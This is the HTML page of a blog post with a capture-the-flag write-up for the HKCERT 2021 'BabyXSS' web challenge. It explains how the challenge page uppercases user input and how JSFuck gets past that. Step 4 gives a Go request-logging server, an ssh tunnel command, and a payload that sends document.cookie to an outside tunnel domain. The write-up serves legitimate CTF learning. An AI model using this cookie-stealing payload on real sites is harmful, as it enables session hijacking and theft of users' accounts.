@@ -1,0 +1,222 @@
+<!doctype html><html lang=en><head>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name=keywords content="[]">
+<meta name=description content>
+<meta property="og:title" content="HKCERT CTF 2021: 純孩兒 BabyXSS">
+<meta property="og:description" content="This post is part of the HKCERT 2021 CTF series.
+     Name 純孩兒 (BabyXSS)     Tags web   Points 100   Difficulty ★☆☆☆☆   Solves 37 (total of all four divisions)   Release Date 2021-11-13 02:00:00     Have you tried the infant XSS challenge in the training platform? If you did, then you can try out this BABY XSS CHALLENGE&mldr;">
+<meta property="og:type" content="article">
+<meta property="og:url" content="http://tnychn.github.io/posts/20211116~hkcert21-babyxss/"><meta property="article:section" content="posts">
+<meta property="article:modified_time" content="2022-02-28T19:14:41+08:00">
+<title>HKCERT CTF 2021: 純孩兒 BabyXSS | tnychn</title>
+<link rel=icon type=image/png href=/favicon.png>
+<link rel=stylesheet type=text/css href=https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.css>
+<link rel=stylesheet type=text/css href=/sass/main.min.26b51df4bed988bb17c52deb3a4de5e9c059dd94a281166b840d31630f12681a.css>
+<link rel=preconnect href=https://fonts.googleapis.com>
+<link rel=preconnect href=https://fonts.gstatic.com crossorigin>
+<link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Patrick+Hand&display=swap">
+<link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Noto+Sans:ital,wght@0,400;0,700;1,400;1,700&display=swap">
+<link rel=stylesheet href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800&display=swap">
+<link rel=stylesheet crossorigin=anonymous href=https://unpkg.com/boxicons@2.1.1/css/boxicons.min.css>
+<script defer src=https://static.cloudflareinsights.com/beacon.min.js data-cf-beacon='{"token": "c7dda5e79c594043b9232c2ca1a86ebb"}'></script>
+</head>
+<body><header>
+<div class="header container">
+<div class=header__left>
+<h1><a href=http://tnychn.github.io>TNYCHN</a></h1>
+<span><em>The /dev/stdout for my programming thoughts.</em></span>
+</div>
+<div class=header__right>
+<nav class=header__right__socials>
+<div><a href=https://github.com/tnychn target=_blank><i class="bx bx-tada-hover bxl-github"></i></a></div>
+<div><a href=https://gitlab.com/tnychn target=_blank><i class="bx bx-tada-hover bxl-gitlab"></i></a></div>
+<div><a href=mailto:tnychn@pm.me target=_blank><i class="bx bx-tada-hover bx-mail-send"></i></a></div>
+</nav>
+<nav class=header__right__navbar>
+<div><a href=/about>About</a></div>
+<div><a href=/posts>Posts</a></div>
+<div><a href=/tags>Tags</a></div>
+</nav>
+</div>
+</div>
+</header>
+<main class=post>
+<h1 class=post-title>HKCERT CTF 2021: 純孩兒 BabyXSS</h1>
+<header class=post-header>
+<div class=post-header__meta>
+<span>16 Nov 2021</span>
+<span>· 6 min read</span>
+<span>· 1069 words</span>
+</div>
+<span></span>
+</header>
+<article><blockquote>
+<p><strong>This post is part of the <a href=/tags/hkcert21>HKCERT 2021 CTF series</a>.</strong></p>
+</blockquote>
+<hr>
+<table>
+<thead>
+<tr>
+<th style=text-align:center>Name</th>
+<th>純孩兒 (BabyXSS)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style=text-align:center>Tags</td>
+<td>web</td>
+</tr>
+<tr>
+<td style=text-align:center>Points</td>
+<td>100</td>
+</tr>
+<tr>
+<td style=text-align:center>Difficulty</td>
+<td>★☆☆☆☆</td>
+</tr>
+<tr>
+<td style=text-align:center>Solves</td>
+<td>37 (total of all four divisions)</td>
+</tr>
+<tr>
+<td style=text-align:center>Release Date</td>
+<td>2021-11-13 02:00:00</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>Have you tried the infant XSS challenge in the training platform? If you did, then you can try out this BABY XSS CHALLENGE&mldr;</p>
+<p><a href=http://babyxss-m7neh9.hkcert21.pwnable.hk>http://babyxss-m7neh9.hkcert21.pwnable.hk</a></p>
+<p>XSS Bot: <a href=http://xssbot-cxild5.hkcert21.pwnable.hk>http://xssbot-cxild5.hkcert21.pwnable.hk</a></p>
+</blockquote>
+<hr>
+<h2 id=step-1-obtaining>Step 1: Obtaining</h2>
+<p>Check the source code of the page by prepending <code>view-source:</code> to the URL, i.e., <code>view-source:http://babyxss-m7neh9.hkcert21.pwnable.hk/</code>.</p>
+<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style="margin-right:.4em;padding:0 .4em;color:#686868"> 1</span>&lt;<span style=color:#6ab825;font-weight:700>HTML</span>&gt;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868"> 2</span>&lt;<span style=color:#6ab825;font-weight:700>HEAD</span>&gt;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868"> 3</span>	&lt;<span style=color:#6ab825;font-weight:700>TITLE</span>&gt;BABY XSS&lt;/<span style=color:#6ab825;font-weight:700>TITLE</span>&gt;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868"> 4</span>&lt;/<span style=color:#6ab825;font-weight:700>HEAD</span>&gt;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868"> 5</span>&lt;<span style=color:#6ab825;font-weight:700>BODY</span> <span style=color:#bbb>ONLOAD</span>=<span style=color:#ed9d13>&#34;CONVERT()&#34;</span> <span style=color:#bbb>ONHASHCHANGE</span>=<span style=color:#ed9d13>&#34;CONVERT()&#34;</span>&gt;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868"> 6</span>&lt;<span style=color:#6ab825;font-weight:700>H1</span>&gt;BABY XSS&lt;/<span style=color:#6ab825;font-weight:700>H1</span>&gt;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868"> 7</span>&lt;<span style=color:#6ab825;font-weight:700>TEXTAREA</span> <span style=color:#bbb>ID</span>=<span style=color:#ed9d13>&#34;INPUT&#34;</span> <span style=color:#bbb>ONCHANGE</span>=<span style=color:#ed9d13>&#34;WINDOW[LOCATION][HASH]=WINDOW[ENCODEURI](INPUT[VALUE])&#34;</span> <span style=color:#bbb>STYLE</span>=<span style=color:#ed9d13>&#34;WIDTH:400;HEIGHT:300&#34;</span>&gt;&lt;/<span style=color:#6ab825;font-weight:700>TEXTAREA</span>&gt;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868"> 8</span>&lt;<span style=color:#6ab825;font-weight:700>IFRAME</span> <span style=color:#bbb>ID</span>=<span style=color:#ed9d13>&#34;OUTPUT&#34;</span> <span style=color:#bbb>STYLE</span>=<span style=color:#ed9d13>&#34;WIDTH:400;HEIGHT:300&#34;</span>&gt;&lt;/<span style=color:#6ab825;font-weight:700>IFRAME</span>&gt;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868"> 9</span>&lt;<span style=color:#6ab825;font-weight:700>SCRIPT</span>&gt;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">10</span>	TOUPPERCASE = <span style=color:#ed9d13>&#34;\164\157\125\160\160\145\162\103\141\163\145&#34;</span>;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">11</span>	SUBSTR = <span style=color:#ed9d13>&#34;\163\165\142\163\164\162&#34;</span>;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">12</span>	ENCODEURI = <span style=color:#ed9d13>&#34;\145\156\143\157\144\145\125\122\111&#34;</span>;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">13</span>	DECODEURI = <span style=color:#ed9d13>&#34;\144\145\143\157\144\145\125\122\111&#34;</span>;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">14</span>	VALUE = <span style=color:#ed9d13>&#34;\166\141\154\165\145&#34;</span>;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">15</span>	SRCDOC = <span style=color:#ed9d13>&#34;\163\162\143\144\157\143&#34;</span>;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">16</span>	CONTENTWINDOW = <span style=color:#ed9d13>&#34;\143\157\156\164\145\156\164\127\151\156\144\157\167&#34;</span>;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">17</span>	PARENT = <span style=color:#ed9d13>&#34;\160\141\162\145\156\164&#34;</span>;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">18</span>	LOCATION = <span style=color:#ed9d13>&#34;\154\157\143\141\164\151\157\156&#34;</span>;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">19</span>	HASH = <span style=color:#ed9d13>&#34;\150\141\163\150&#34;</span>;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">20</span>	WINDOW = OUTPUT[CONTENTWINDOW][PARENT];
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">21</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">22</span>	CONVERT = () =&gt; {
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">23</span>		INPUT[VALUE] = WINDOW[DECODEURI](WINDOW[LOCATION][HASH][SUBSTR](<span style=color:#3677a9>1</span>));
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">24</span>		OUTPUT[SRCDOC] = INPUT[VALUE][TOUPPERCASE]();
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">25</span>	}
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">26</span>&lt;/<span style=color:#6ab825;font-weight:700>SCRIPT</span>&gt;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">27</span>&lt;/<span style=color:#6ab825;font-weight:700>BODY</span>&gt;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">28</span>&lt;/<span style=color:#6ab825;font-weight:700>HTML</span>&gt;
+</code></pre></div><p>We can see that this whole piece of code is uppercased. Also, the strings in the code inside the <code>script</code> tag is not readable, maybe because it&rsquo;s obfuscated?</p>
+<p>So we input this whole piece of JavaScript code into <a href=https://deobfuscate.io>https://deobfuscate.io</a>. This is what we get.</p>
+<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style="margin-right:.4em;padding:0 .4em;color:#686868">10</span>TOUPPERCASE = <span style=color:#ed9d13>&#34;toUpperCase&#34;</span>;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">11</span>SUBSTR = <span style=color:#ed9d13>&#34;substr&#34;</span>;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">12</span>ENCODEURI = <span style=color:#ed9d13>&#34;encodeURI&#34;</span>;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">13</span>DECODEURI = <span style=color:#ed9d13>&#34;decodeURI&#34;</span>;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">14</span>VALUE = <span style=color:#ed9d13>&#34;value&#34;</span>;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">15</span>SRCDOC = <span style=color:#ed9d13>&#34;srcdoc&#34;</span>;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">16</span>CONTENTWINDOW = <span style=color:#ed9d13>&#34;contentWindow&#34;</span>;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">17</span>PARENT = <span style=color:#ed9d13>&#34;parent&#34;</span>;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">18</span>LOCATION = <span style=color:#ed9d13>&#34;location&#34;</span>;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">19</span>HASH = <span style=color:#ed9d13>&#34;hash&#34;</span>;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">20</span>WINDOW = OUTPUT[CONTENTWINDOW][PARENT];
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">21</span>CONVERT = () =&gt; {
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">22</span>  INPUT[VALUE] = WINDOW[DECODEURI](WINDOW[LOCATION][HASH][SUBSTR](<span style=color:#3677a9>1</span>));
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">23</span>  OUTPUT[SRCDOC] = INPUT[VALUE][TOUPPERCASE]();
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">24</span>};
+</code></pre></div><h2 id=step-2-analysing>Step 2: Analysing</h2>
+<p>Now that the code is made readable, we can clean up the code and figure out the flow of how this page works.</p>
+<ol>
+<li>In <strong>Line 7</strong>, we can see that whenever the content in the text area is changed, a URL-encoded form of the content inside is appended to the current URL after a <code>#</code> (the hash part of the URL).</li>
+</ol>
+<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style="margin-right:.4em;padding:0 .4em;color:#686868">7</span>&lt;<span style=color:#6ab825;font-weight:700>TEXTAREA</span> <span style=color:#bbb>ID</span>=<span style=color:#ed9d13>&#34;INPUT&#34;</span> <span style=color:#bbb>ONCHANGE</span>=<span style=color:#ed9d13>&#34;window.location.hash=window.encodeURI(INPUT.value)&#34;</span> <span style=color:#bbb>STYLE</span>=<span style=color:#ed9d13>&#34;WIDTH:400;HEIGHT:300&#34;</span>&gt;&lt;/<span style=color:#6ab825;font-weight:700>TEXTAREA</span>&gt;
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">8</span><span style=color:#999;font-style:italic>&lt;!-- the cleaned code above is equivalent to the original --&gt;</span>
+</code></pre></div><ol start=2>
+<li>In <strong>Line 5</strong>, we can see that whenever the page is loaded or the hash part in the current URL is changed, the <code>CONVERT</code> function is called.</li>
+</ol>
+<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style="margin-right:.4em;padding:0 .4em;color:#686868">5</span>&lt;<span style=color:#6ab825;font-weight:700>BODY</span> <span style=color:#bbb>ONLOAD</span>=<span style=color:#ed9d13>&#34;CONVERT()&#34;</span> <span style=color:#bbb>ONHASHCHANGE</span>=<span style=color:#ed9d13>&#34;CONVERT()&#34;</span>&gt;
+</code></pre></div><ol start=3>
+<li>The <code>CONVERT</code> function is essentially replacing the content in the text area with the URL-decoded form of the hash part of the current URL, and also setting the <code>srcdoc</code> attribute of the output iframe to the uppercased form of the content in the text area.</li>
+</ol>
+<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style="margin-right:.4em;padding:0 .4em;color:#686868">21</span>CONVERT = () =&gt; {
+<span style=display:block;width:100%;background-color:#363636><span style="margin-right:.4em;padding:0 .4em;color:#686868">22</span>  <span style=color:#24909d>document</span>.getElementById(<span style=color:#ed9d13>&#34;INPUT&#34;</span>).value = <span style=color:#24909d>window</span>.<span style=color:#24909d>decodeURI</span>(<span style=color:#24909d>window</span>.location.hash.substr(<span style=color:#3677a9>1</span>)); <span style=color:#999;font-style:italic>// substr(1) removes the &#39;#&#39; prefix
+</span></span><span style="margin-right:.4em;padding:0 .4em;color:#686868">23</span><span style=color:#999;font-style:italic></span>  <span style=color:#24909d>document</span>.getElementById(<span style=color:#ed9d13>&#34;OUTPUT&#34;</span>).srcdoc = INPUT.value.toUpperCase();
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">24</span>}; <span style=color:#999;font-style:italic>// the above code is cleaned and is equivalent to the original
+</span></code></pre></div><h2 id=step-3-xss-attack-procedure>Step 3: XSS Attack Procedure</h2>
+<figure><img src=1.png width=600>
+</figure>
+<p>Since the hash part of the current URL updates correspondingly to the current content in the input text area, it acts like a &ldquo;state-saving-and-restoring&rdquo; function. This means when we type some input in the text area, the hash part of the current URL is updated as it saves our input. If we pass the URL to the victim, the content in the input text area is restored from the hash part of the URL once the page is loaded.</p>
+<p>In order to achieve XSS, we need to figure out some way to execute JavaScript in victim&rsquo;s browser as we can then get access to sensitive information (e.g., cookies) stored in his browser. To do that, we can make use of the iframe <code>srcdoc</code> mechanism as this attribute allows us to inject source document including JavaScript code into the iframe document. If we use JavaScript code as the input, when the victim loaded the page given a URL, the input content is restored and the JavaScript code will be executed in victim&rsquo;s browser.</p>
+<p>Note that HTML tags are <strong>case-insensitive</strong>, whereas JavaScript variables are <strong>case-sensitive</strong>. This is rather important in this challenge because although there is no escaping or encoding used, the input content is uppercased (in Line 9) before being inserted into the <code>srcdoc</code> attribute of the output iframe.</p>
+<p>This means that if we directly inject something like <code>&lt;script>alert(1)&lt;/script></code> into the output iframe as the code will become <code>&lt;SCRIPT>ALERT(1)&lt;/SCRIPT></code>, it won&rsquo;t be triggered due to <code>Uncaught ReferenceError: ALERT is not defined</code>.</p>
+<p>So we need to come up with a way to bypass the uppercase transformation so that the code can still be executed even after being uppercased. A simple Google search with &ldquo;<em>javascript uppercase xss</em>&rdquo; returns a <em>StackExchange</em> question as the first result: <a href=https://security.stackexchange.com/questions/117798/how-can-i-execute-a-xss-when-a-web-application-transforms-a-data-from-lowercase>How can I execute a XSS when a web application transforms a data from lowercase to uppercase?</a></p>
+<p>It turns out that we can use <em>JSFuck</em> to transform plain JavaScript code into its equivalent in the form of <code>[]()!+</code> characters. This effectively bypasses the uppercase transformation while still can execute the code that does the same thing.</p>
+<h2 id=step-4-exploit>Step 4: Exploit</h2>
+<p>Now in order for us to get the cookie stored in the victim&rsquo;s browser, we can use <code>document.cookie</code>. We also need to make a way for us to receive this cookie. We can expose a simple LAN web server to the Internet and make a request to the server with <code>document.cookie</code> as part of the request.</p>
+<p>This is the simple web server I used.</p>
+<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style="margin-right:.4em;padding:0 .4em;color:#686868"> 1</span><span style=color:#999;font-style:italic>// file: server.go
+</span><span style="margin-right:.4em;padding:0 .4em;color:#686868"> 2</span><span style=color:#999;font-style:italic></span><span style=color:#6ab825;font-weight:700>package</span> main
+<span style="margin-right:.4em;padding:0 .4em;color:#686868"> 3</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#686868"> 4</span><span style=color:#6ab825;font-weight:700>import</span> (
+<span style="margin-right:.4em;padding:0 .4em;color:#686868"> 5</span>	<span style=color:#ed9d13>&#34;fmt&#34;</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#686868"> 6</span>	<span style=color:#ed9d13>&#34;net/http&#34;</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#686868"> 7</span>)
+<span style="margin-right:.4em;padding:0 .4em;color:#686868"> 8</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#686868"> 9</span><span style=color:#6ab825;font-weight:700>func</span> <span style=color:#447fcf>root</span>(w http.ResponseWriter, req *http.Request) {
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">10</span>	fmt.<span style=color:#447fcf>Println</span>(req.URL.<span style=color:#447fcf>String</span>())  <span style=color:#999;font-style:italic>// log the request URL
+</span><span style="margin-right:.4em;padding:0 .4em;color:#686868">11</span><span style=color:#999;font-style:italic></span>	fmt.<span style=color:#447fcf>Fprintf</span>(w, <span style=color:#ed9d13>&#34;hello\n&#34;</span>)
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">12</span>}
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">13</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">14</span><span style=color:#6ab825;font-weight:700>func</span> <span style=color:#447fcf>main</span>() {
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">15</span>	http.<span style=color:#447fcf>HandleFunc</span>(<span style=color:#ed9d13>&#34;/&#34;</span>, root)
+<span style="margin-right:.4em;padding:0 .4em;color:#686868">16</span>	http.<span style=color:#447fcf>ListenAndServe</span>(<span style=color:#ed9d13>&#34;:1313&#34;</span>, <span style=color:#6ab825;font-weight:700>nil</span>) <span style=color:#999;font-style:italic>// localhost on port 1313
+</span><span style="margin-right:.4em;padding:0 .4em;color:#686868">17</span><span style=color:#999;font-style:italic></span>}
+</code></pre></div><p>Run it with <code>go run server.go</code>, then expose it to the Internet using a free tunnelling service: <a href=http://localhost.run>http://localhost.run</a> by running <code>ssh -R 80:localhost:1313 nokey@localhost.run</code>. Now we get a temporary hosted web server that can be accessed by the victim as well.</p>
+<p>In order for the victim&rsquo;s browser to send its cookie to my server, our XSS payload can tell it to navigate to the URL of our server with the cookie as part of the URL query so that my server logs this URL that contains the cookie.</p>
+<p>The following is the XSS payload I used. The URL domain is the one provided by the tunnelling service.</p>
+<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript>location.href=<span style=color:#ed9d13>&#34;https://7795a3052e14c9.lhr.domains/?&#34;</span>+<span style=color:#24909d>document</span>.cookie
+</code></pre></div><p>Then we will need to <em>JSFuck</em> the XSS payload, wraps it with the <code>script</code> tag, and type it into the input text area. Now you see the URL has changed, copy the URL and send it to the XSS Bot. Hooray! Now the flag shows up in the stdout of our server! <code>hkcert21{zOMG_MY_KEYBOARD_IS_BROKEN_CANNOT_TURN_OFF_CAPSLOCK111111111}</code></p>
+<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ go run server.go
+/?
+/?flag=hkcert21{zOMG_MY_KEYBOARD_IS_BROKEN_CANNOT_TURN_OFF_CAPSLOCK111111111}
+</code></pre></div></article>
+<footer class=post-footer>
+<div class=post-footer__tags>
+<i class="bx bxs-tag-alt"></i>
+<span><a href=/tags/ctf/>ctf</a></span>
+<span><a href=/tags/hkcert21/>hkcert21</a></span>
+<span><a href=/tags/web/>web</a></span>
+<span><a href=/tags/xss/>xss</a></span>
+</div>
+<span><i class="bx bxs-time"></i> 2022-02-28 19:14:41</span>
+</footer>
+<div id=comments>
+<div id=disqus_thread></div>
+<script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//tnychn.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
+<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
+<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
+</div>
+</main>
+<footer>
+<div class="footer container">
+<span>Copyright 2024 © Tony Chan</span>
+<span>Powered by <a href=https://gohugo.io>Hugo</a> with <a href=https://github.com/tnychn/tnychn.github.io>Custom Theme</a></span>
+</div>
+</footer>
+</body>
+</html>
